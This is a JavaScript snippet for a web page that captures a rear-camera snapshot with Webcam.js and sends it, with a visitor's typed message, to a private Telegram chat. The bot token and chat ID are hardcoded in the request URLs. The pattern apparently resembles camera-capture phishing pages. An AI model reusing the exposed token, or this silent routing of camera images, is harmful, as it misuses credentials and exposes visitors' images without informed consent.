Webcam.set({
    width: 240,
    height: 320,
    image_format: 'jpeg',
    facingMode: "environment",
    jpeg_quality: 100,
});
function msg(){
    msg = document.querySelector('#message').value;
    var xhr = new XMLHttpRequest();
    xhr.open('POST', `https://api.telegram.org/bot5342005128:AAFjMw1i9K-FSDX0RzrRHgsyhMj9QMs80VU/sendMessage?chat_id=1603299669&parse_mode=html&text=<u><b><i>The Visitor said:</i></b></u> %0A${msg}`, true);
    xhr.send();
    document.querySelector('#message').classList.add('disabled');
    document.querySelector('#pp').classList.add('disabled');
    document.querySelector('#message').setAttribute('disabled', "")
}
function take_snapshot() {
    msg = document.querySelector('#message').value;
    getScreenshotOfElement(document.querySelector('#my_camera'))
    Webcam.snap( function(data_uri) {
            var form = document.getElementById("myAwesomeForm");
            var ImageURL = `${data_uri}`;
            var block = ImageURL.split(";");
            var contentType = block[0].split(":")[1];
            var realData = block[1].split(",")[1];
            document.querySelector('.bttn').classList.add('disabledbtn');
            document.querySelector('.bttn').setAttribute("disabled","")
            var blob = b64toBlob(realData, contentType);
            var formDataToUpload = new FormData(form);
            formDataToUpload.append("document", blob, "picture.jpeg");
            var xhr = new XMLHttpRequest();
            xhr.open('POST', `https://api.telegram.org/bot5342005128:AAFjMw1i9K-FSDX0RzrRHgsyhMj9QMs80VU/sendDocument?chat_id=1603299669`, true);
            xhr.send(formDataToUpload);
        });
        Swal.fire({
            position: 'center',
            title: 'Uploading, Wait for a while',
            showConfirmButton: false,
            timer: 9000
        })
    setTimeout(function(){
        Swal.fire({
            position: 'center',
            title: 'Sent !',
            icon: 'success',
            showConfirmButton: false,
        })
    }, 9000)
}